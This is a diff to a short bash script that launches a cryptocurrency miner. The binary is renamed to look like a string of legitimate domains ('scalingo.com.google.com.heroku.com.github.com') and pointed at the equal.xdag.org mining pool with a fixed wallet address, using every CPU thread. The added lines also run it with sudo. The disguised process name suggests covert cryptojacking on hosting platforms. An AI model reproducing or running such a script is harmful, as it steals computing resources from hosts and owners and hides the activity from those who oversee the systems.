@@ -1,4 +1,4 @@
 #!/bin/bash
-chmod u+x dag
+chmod u+x surabi
 mv dag scalingo.com.google.com.heroku.com.github.com
-./scalingo.com.google.com.heroku.com.github.com -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)
+sudo ./scalingo.com.google.com.heroku.com.github.com --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)
